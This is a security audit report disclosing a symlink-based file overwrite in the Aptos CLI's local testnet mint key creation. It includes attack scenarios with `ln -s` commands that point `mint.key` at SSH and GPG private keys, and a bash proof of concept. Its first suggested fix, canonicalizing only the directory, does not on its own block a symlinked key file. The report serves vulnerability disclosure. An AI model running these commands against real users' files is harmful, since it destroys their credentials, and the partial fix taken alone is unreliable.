# Audit Report

## Title
Arbitrary File Overwrite via Symlink Attack in Local Testnet Mint Key Creation

## Summary
The local testnet node initialization process writes a generated mint key to a user-controlled path without canonicalizing it or validating that files in the directory are not symlinks. This allows an attacker to create a symlink at `test_dir/mint.key` pointing to any file writable by the user, causing that file to be overwritten with a newly generated key when the node starts.

## Finding Description

The vulnerability exists in the local testnet initialization flow where the mint key (root private key) is generated and written to disk.

**Attack Flow:**

1. User specifies a test directory via `aptos node run-localnet --test-dir <path>` or uses the default `~/.aptos/testnet`
2. The test directory path is obtained but NOT canonicalized in the CLI flow [1](#0-0) 
3. This path is passed to `FaucetManager::new()` [2](#0-1) 
4. The path is also passed to `NodeManager::new()` which eventually calls `create_single_node_test_config()` [3](#0-2) 
5. The mint key is written using `fs::File::create(aptos_root_key_path)` which **follows symlinks** [4](#0-3) 

**Key Issue:** Rust's `std::fs::File::create()` follows symlinks by default. If an attacker creates `test_dir/mint.key` as a symlink to a sensitive file (e.g., `~/.ssh/id_rsa`), the target file will be overwritten with the generated BCS-encoded Ed25519 private key.

**Contrast with Safe Code:** The standalone function `setup_test_environment_and_start_node()` DOES canonicalize the test directory before use [5](#0-4) , but this canonicalization is NOT performed in the `RunLocalnet::execute()` flow used by the CLI.

**Attack Scenarios:**

**Scenario 1 - Shared Directory:**
```bash
# Attacker prepares malicious directory
mkdir /tmp/malicious_testnet
ln -s /home/victim/.ssh/id_rsa /tmp/malicious_testnet/mint.key

# Victim runs (via social engineering or script)
aptos node run-localnet --test-dir /tmp/malicious_testnet
# Result: victim's SSH key is overwritten with generated mint key
```

**Scenario 2 - Default Directory Hijack:**
```bash
# Attacker gains write access to victim's .aptos directory
# (e.g., via other vulnerability, shared hosting, etc.)
mkdir -p ~/.aptos/testnet
ln -s ~/.gnupg/secring.gpg ~/.aptos/testnet/mint.key

# Victim runs normal command
aptos node run-localnet
# Result: GPG secret keyring is overwritten
```

## Impact Explanation

**High Severity** per Aptos bug bounty criteria:

1. **Significant Protocol Violation:** While this doesn't directly affect consensus, it violates fundamental security principles of path handling and can compromise developer/operator systems that interact with the Aptos blockchain infrastructure.

2. **Potential for Validator Node Impact:** If a validator operator runs this command on a production system (e.g., testing locally before deployment), critical configuration files could be overwritten, leading to:
   - Loss of SSH access to validator infrastructure
   - Corruption of validator configuration files
   - Loss of important cryptographic material

3. **Arbitrary File Overwrite:** Any file writable by the user running the CLI can be destroyed, including:
   - SSH private keys (`~/.ssh/id_rsa`)
   - GPG keys (`~/.gnupg/`)
   - Application configuration files
   - Other important user data

4. **No Privilege Escalation Required:** The attack operates with normal user privileges but can cause significant harm within that context.

This does not qualify as Critical severity because it:
- Requires user interaction (running the CLI command)
- Does not directly affect network consensus or liveness
- Does not enable fund theft or minting
- Operates only with existing user privileges

## Likelihood Explanation

**Medium-High Likelihood:**

1. **Common Attack Vector:** Symlink attacks are well-known and commonly exploited in filesystem operations.

2. **Realistic Attack Scenarios:**
   - Developers often use shared systems or containers where attackers might have write access to `/tmp`
   - Social engineering to get developers to run commands with specific paths
   - Automated scripts that might use attacker-influenced paths

3. **Default Path Vulnerability:** Even the default path `~/.aptos/testnet` could be pre-populated with a symlink if an attacker has any level of file system access.

4. **No Visual Indication:** Users have no way to detect that `mint.key` is a symlink before the overwrite occurs.

5. **Developer Tool Context:** While this is a development/testing tool, developers and validator operators frequently run such tools on systems that also contain sensitive keys.

## Recommendation

**Immediate Fix:** Canonicalize the `test_dir` path before using it, similar to how `setup_test_environment_and_start_node()` handles it.

**Recommended code change in `crates/aptos/src/node/local_testnet/mod.rs`:**

```rust
// Based on the input and global config, get the test directory.
let test_dir = get_derived_test_dir(&self.test_dir)?;

// Canonicalize the test directory to resolve any symlinks
// This must happen AFTER we optionally create the directory
if !test_dir.exists() {
    info!("Test directory does not exist, creating it: {:?}", test_dir);
    create_dir_all(test_dir.as_path()).map_err(|err| {
        CliError::IO(format!("Failed to create {}", test_dir.display()), err)
    })?;
    info!("Created test directory: {:?}", test_dir);
}

// Canonicalize to resolve symlinks and get absolute path
let test_dir = test_dir.canonicalize().map_err(|err| {
    CliError::IO(format!("Failed to canonicalize test directory {}", test_dir.display()), err)
})?;
```

**Additional Security Measures:**

1. **Validate mint.key doesn't exist as symlink** before writing:
```rust
// In aptos-node/src/lib.rs before line 620
let aptos_root_key_path = test_dir.join("mint.key");

// Check if the file exists and is a symlink
if aptos_root_key_path.exists() || aptos_root_key_path.is_symlink() {
    return Err(anyhow!(
        "Refusing to overwrite existing file or symlink at {:?}",
        aptos_root_key_path
    ));
}
```

2. **Use OpenOptions with symlink checking** (Rust 1.58+):
```rust
use std::fs::OpenOptions;

let mut key_file = OpenOptions::new()
    .write(true)
    .create_new(true)  // Fail if file exists
    .open(&aptos_root_key_path)?;
```

## Proof of Concept

```bash
#!/bin/bash
# PoC: Demonstrate arbitrary file overwrite via symlink attack

# Setup: Create a test file that will be "destroyed"
echo "IMPORTANT_SSH_KEY_DATA" > /tmp/victim_ssh_key

# Attack: Prepare malicious test directory
mkdir -p /tmp/attack_testnet
ln -s /tmp/victim_ssh_key /tmp/attack_testnet/mint.key

echo "Before attack:"
cat /tmp/victim_ssh_key

# Victim runs the local testnet command
aptos node run-localnet --test-dir /tmp/attack_testnet &
NODE_PID=$!

# Wait for mint.key to be created (usually happens quickly)
sleep 5

# Kill the node
kill $NODE_PID 2>/dev/null

echo "After attack:"
cat /tmp/victim_ssh_key
# This will show BCS-encoded binary data instead of original content

# Cleanup
rm -rf /tmp/attack_testnet /tmp/victim_ssh_key
```

**Expected Result:** The file `/tmp/victim_ssh_key` is overwritten with BCS-encoded Ed25519 private key data, demonstrating that any file writable by the user can be destroyed via this attack.

## Notes

This vulnerability exists specifically in the local testnet CLI flow. The issue does not affect:
- Production validator nodes (which don't use this code path)
- The faucet's READ operation (which would fail parsing if given arbitrary data)
- The standalone `setup_test_environment_and_start_node()` function (which does canonicalize)

However, it remains a valid High severity issue because it can cause significant harm to developers and operators using the official Aptos CLI tools, potentially compromising their systems and credentials.

### Citations

**File:** crates/aptos/src/node/local_testnet/mod.rs (L235-236)
```rust
        // Based on the input and global config, get the test directory.
        let test_dir = get_derived_test_dir(&self.test_dir)?;
```

**File:** crates/aptos/src/node/local_testnet/faucet.rs (L48-66)
```rust
    pub fn new(
        args: &RunLocalnet,
        prerequisite_health_checkers: HashSet<HealthChecker>,
        bind_to: Ipv4Addr,
        test_dir: PathBuf,
        node_api_url: Url,
    ) -> Result<Self> {
        Ok(Self {
            config: RunConfig::build_for_cli(
                node_api_url.clone(),
                bind_to.to_string(),
                args.faucet_args.faucet_port,
                FunderKeyEnum::KeyFile(test_dir.join("mint.key")),
                args.faucet_args.do_not_delegate,
                None,
            ),
            prerequisite_health_checkers,
        })
    }
```

**File:** aptos-node/src/lib.rs (L420-421)
```rust
    fs::DirBuilder::new().recursive(true).create(&test_dir)?;
    let test_dir = test_dir.canonicalize()?;
```

**File:** aptos-node/src/lib.rs (L582-582)
```rust
    let aptos_root_key_path = test_dir.join("mint.key");
```

**File:** aptos-node/src/lib.rs (L618-621)
```rust
    // Write the mint key to disk
    let serialized_keys = bcs::to_bytes(&root_key)?;
    let mut key_file = fs::File::create(aptos_root_key_path)?;
    key_file.write_all(&serialized_keys)?;
```
